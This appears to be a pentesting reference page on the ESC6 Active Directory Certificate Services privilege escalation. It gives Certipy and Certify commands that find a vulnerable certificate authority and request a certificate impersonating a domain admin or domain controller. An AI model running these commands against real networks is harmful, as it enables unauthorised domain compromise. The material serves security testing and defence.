# (ESC6) `EDITF_ATTRIBUTESUBJECTALTNAME2`

From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) can be used to enumerate info about the CAs, including the "User Specified SAN" flag state which is an alias to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.
```bash
certipy find -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -stdout | grep "User Specified SAN"
```

> [!TIP]
> By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.

Once the right template is found (i.e. the default User template), a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).
```bash
# To specify a user account in the SAN
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -template 'vulnerable template' -upn 'domain admin'

# To specify a computer account in the SAN
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.domain.local'
```

The certificate can then be used with Pass-the-Certificate to obtain a TGT and authenticate.

From Windows systems, the [Certify](https://github.com/GhostPack/Certify) tool can be used to enumerate info about the CAs, including the "UserSpecifiedSAN" flag state which refers to the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag.
```powershell
Certify.exe cas
```

If the flag is enabled on a CA, certify can then be used to find all enabled templates configured with EKUs allowing for authentication, and allowing low-priv users to enroll.
```powershell
Certify.exe /enrolleeSuppliesSubject
Certify.exe /clientauth
```

Once the right template is found (i.e. the default User template), a request shall be made to obtain a certificate, with another high-priv user set as SAN (`subjectAltName`).
```powershell
Certify.exe request /ca:'domain\ca' /template:"Certificate template" /altname:"admin"
```

The certificate can then be used with Pass-the-Certificate to obtain a TGT and authenticate.
